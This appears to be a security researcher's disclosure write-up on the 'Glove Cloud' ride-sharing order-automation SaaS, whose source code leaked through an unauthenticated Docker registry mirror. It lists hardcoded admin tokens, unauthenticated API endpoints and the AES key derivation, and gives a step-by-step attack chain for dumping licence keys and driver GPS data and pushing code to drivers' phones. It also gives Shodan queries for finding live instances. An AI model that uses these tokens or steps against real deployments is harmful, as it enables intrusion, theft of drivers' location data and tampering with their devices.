# Glove Cloud (手套云) — Ride-Sharing Automation SaaS: Source Code Leaked via Unauth Docker Registry Mirror

**Date:** 2026-05-08  
**Discovery vector:** Shodan `http.html:"metabase/frontend"` → unauth Docker registry → image pull → layer extraction  
**Registry:** `154.12.63.166:5000` (1yidc.com Chinese Docker mirror service)  
**Software:** `wangxianlin996/{gc_app,gc_manage,gc_bot}`  
**Category:** Commercial gray-area SaaS (ride-sharing order automation) / Credential leak

---

## Summary

A Shodan sweep for Metabase deployments (`http.html:"metabase/frontend"`) returned Docker registries that mirror `metabase/metabase` images. One such registry — `154.12.63.166:5000`, operated by the Chinese Docker mirror service `1yidc.com` — also exposed three private commercial software images from the Docker Hub account `wangxianlin996`. Layer extraction and source code analysis revealed:

1. Full Python source of a commercial SaaS platform for automating ride-sharing order acceptance ("order snatching" / 抢单) across five Chinese platforms
2. Two hardcoded admin credentials baked into Docker image layers
3. Authentication completely commented out in the management backend

---

## Software Identity

**Brand name:** Glove Cloud (手套云 / gloveCloudManage)  
**Developer:** `wangxianlin996` (Docker Hub)  
**Language:** Python (FastAPI + uvicorn + MongoDB)  
**Purpose:** Automated ride-sharing order acceptance for drivers — sells CDKey-licensed access to order automation for:
- 哈啰 (Hello/Helo)
- 嘀嗒 (Dida)
- 滴滴 (DiDi)
- 小拉 (Xiaola)
- 金马 (Jinma)

**Architecture:**
```
[Mobile client app]
   └─── WebSocket (flash-token: CDKey) ──► [gc_app: per-operator instance]
                                                │
                                         flash-token: gloveCloudManage
                                                │
                                          [gc_manage: SaaS admin panel]
                                                │
                                          [MongoDB: glove-cloud DB]

[gc_bot: Telegram/sales bot]
   └─── /api/cdkey/create_from_bot ──► [gc_manage]
```

**Versioning:** gc_app v2.5.x, gc_manage v2.5.11, gc_bot v2.1.1 (active development)

---

## Credentials Leaked

### 1. Webhook Admin Token (gc_app instances)
```
flash-token: gloveCloudManage
```
Hardcoded in:
- `code/common/system_config.py`: `service_token = "gloveCloudManage"`
- `code/utils/http_client_helper.py`: `__headers = {"flash-token": "gloveCloudManage", ...}`

Grants unauthenticated access to all `/webhook/` admin endpoints on any deployed gc_app instance:
- `GET /webhook/get_api_router` — full obfuscated route map (breaks route randomization entirely)
- `GET /webhook/base_statistics` — CDKey totals, active users, online count
- `GET /webhook/del_cache_cdkey?key=X` — invalidate any user's session
- `GET /webhook/update_app_info` — force app to re-fetch config (SSRF pivot to management backend)
- `GET /webhook/update_app_script` — force app to re-fetch scripts

### 2. Management Backend Admin Token
```
flash-token: tunan_admin
```
Hardcoded in `code/templates/index.html` in both gc_app and gc_manage:
```javascript
requestAdaptor(api) {
  return { ...api, headers: { ...api.headers, "flash-token": "tunan_admin" } };
}
```
Served to any browser loading the admin panel. Would grant full API access if authentication were enforced.

### 3. Management Backend URL
```
API_HOST: https://3xsw4ap8wah59.cfc-execute.bj.baidubce.com
```
Baidu Cloud Function Compute endpoint. Currently returns "no router" (function exists, triggers not configured for these paths). Indicates previous or development hosting of gc_manage on Baidu CFC.

---

## Authentication Disabled in gc_manage

`code/common/middleware.py` — token verification commented out in full:
```python
async def token_verification_middleware(request: Request, call_next):
    try:
        # model = request.url.path.split('/')[1]
        # if model == "api":
        #     # token = request.headers.get("flash-token")
        #     # if token != system_config.auth_token:
        #     #     raise CdkeyNoException()
        response = await call_next(request)
        return response
```

Every endpoint in every gc_manage deployment is **fully unauthenticated**. Admin UI at `/gcm.ui`.

### Full Unauthenticated API Surface (gc_manage)
```
# App management
POST /api/app/create                    Create app
POST /api/app/get_all                   List ALL apps
GET  /api/app/get?app_name=X           Get app info
GET  /api/app/config?app_name=X        Get app config (includes domain, notices, extras)
POST /api/app/save_config              Overwrite app config
GET  /api/app/script_list              List script files
POST /api/app/script_read_file         Read any script
POST /api/app/script_edit_file         Write any script
POST /api/app/script_remove_file       Delete any file
POST /api/app/oss_upload_file          Upload files to app

# CDKey management (full database)
POST /api/cdkey/create                 Generate CDKeys
POST /api/cdkey/get_all                List ALL CDKeys (paginated — full DB dump)
POST /api/cdkey/get_all_recharge       Full recharge/activation records
POST /api/cdkey/recharge               Extend any CDKey
POST /api/cdkey/unbind                 Unbind any CDKey from device
POST /api/cdkey/delete_cdkey           Delete CDKey
POST /api/cdkey/create_from_bot        Bot-generate CDKeys (no limit specified)

# System
GET  /api/system/config                Dump system config (service URLs, etc.)
POST /api/system/save_config           Overwrite system config
GET  /api/system/base_statistics?app_name=X  Per-app stats (forwards to gc_app)
POST /api/system/statistics_online     Login trend data
POST /api/system/statistics_activation Activation trend data

# VIP/agent tracking
POST /api/vip/get_all_location         GPS coordinates of all VIP agents (real-time location data!)
```

---

## Additional Findings

### AES Encryption — Fully Reversible
`code/utils/request_encode_helper.py` reveals the full AES key derivation for client message encryption:
```python
key = ss[:4].zfill(4) + device_id[:6].zfill(6) + app_key[:6].zfill(6)  # 16 bytes
iv  = ss[-4:].zfill(4) + device_id[-6:].zfill(6) + app_key[-6:].zfill(6)  # 16 bytes
```
Where `ss`, `device_id`, `app_key` are HTTP request headers. With source in hand, all client communications are trivially decryptable by a passive observer who can see the request headers.

### Real-Time GPS Location Data
`code/dao/agent_location_dao.py` stores GPS coordinates for "VIP agents" in MongoDB. The gc_manage `/api/vip/get_all_location` endpoint exposes this data without authentication — real-time location tracking of drivers using the system.

### Route Obfuscation Completely Bypassed
The `EnableRandomApi` flag randomizes all HTTP and WebSocket endpoint paths on startup, stored in `new_env/api_path.ini`. This anti-analysis measure is defeated entirely by `GET /webhook/get_api_router` returning the complete mapping.

### Developer Infrastructure (commented test code)
```python
# asyncio.run(update_app_script("https://hello1.kkxxs.top"))
```
Domain `kkxxs.top` (NXDOMAIN at time of research) — developer's test deployment, now offline.

---

## Attack Chain (Hypothetical Live gc_manage Instance)

```
1. Discover gc_manage via Shodan
   http.title:"手套云管理后台" OR http.html:"gcm.ui" OR http.html:"tunan_admin"

2. Confirm unauthenticated access
   GET /api/system/config
   → {service_url: "...", ...}

3. Dump all CDKeys
   POST /api/cdkey/get_all {"app_name": "X", "page": 1, "size": 1000}
   → Complete CDKey database (hashes, device bindings, expiry, phone numbers)

4. Dump real-time driver locations
   POST /api/vip/get_all_location {"page": 1, "size": 1000}
   → GPS coordinates + CDKey bindings + device IDs

5. Generate unlimited CDKeys (full service compromise)
   POST /api/cdkey/create {"app_name": "X", "card_type": "月卡", "count": 100}
   → 100 free month-long activation codes

6. Read/modify any script pushed to driver clients
   POST /api/app/script_read_file {"app_name": "X", "file_path": "..."}
   → Source of order-automation scripts sent to mobile clients
   POST /api/app/script_edit_file → Arbitrary code injection to mobile clients
```

---

## MongoDB Schema (glove-cloud database)

| Collection | Contents |
|---|---|
| `app_info` | App definitions (platforms, CDKey settings) |
| `app_config` | Per-app domain, notices, server/client extras |
| `cdkey_info` | All CDKeys: hash, device_id, phone, timestamps, unbind count |
| `cdkey_recharge_info` | All activation/recharge records |
| `cdkey_trial_info` | Trial code usage |
| `system_config` | Management backend URLs, service_url, tk_pool config |
| `agent_location` | Real-time GPS + device_id + CDKey for VIP agents |
| `app_login` | Login event records |
| `unbind_record` | CDKey unbind audit log |
| `error_record` | Error logs |
| `pool_config` | TK pool configuration |
| `hello`, `dida`, `didi`, `xiaola` | Platform-specific token data |

---

## Signal Classification

| Item | Risk | Notes |
|---|---|---|
| Hardcoded `gloveCloudManage` token | High | Any deployed gc_app instance exploitable |
| Hardcoded `tunan_admin` token in HTML | Medium | Served to all admin panel visitors |
| gc_manage zero-auth | Critical | If any public gc_manage instance exists |
| Real-time driver GPS exposure | High | Personal location data of ride-sharing drivers |
| AES key derivation exposed | Medium | Requires passive network access to exploit |
| Mobile client code injection | Critical | If gc_manage instance found; pushes code to driver phones |

---

## Discovery Path Note

This finding emerged from the **BI/Dashboard survey** (`http.html:"metabase/frontend"`). Docker registries that mirror `metabase/metabase` appear in this query because the HTML body includes the string "metabase/frontend" from the Metabase React frontend bundle. The registry at `154.12.63.166` is a general-purpose Docker Hub mirror (operated by `1yidc.com`) that caches everything — including private commercial images from end-user Docker Hub accounts.

This is a **supply chain exposure pattern**: operators who push private images to Docker Hub and deploy via mirrors like 1yidc.com inadvertently expose their source code to anyone querying the mirror's unauthenticated `_catalog` endpoint.

**Fingerprint for future scanning:**
```
http.html:"wangxianlin996"
http.html:"gloveCloudManage"
http.html:"tunan_admin" port:80
http.title:"手套云管理后台"
```
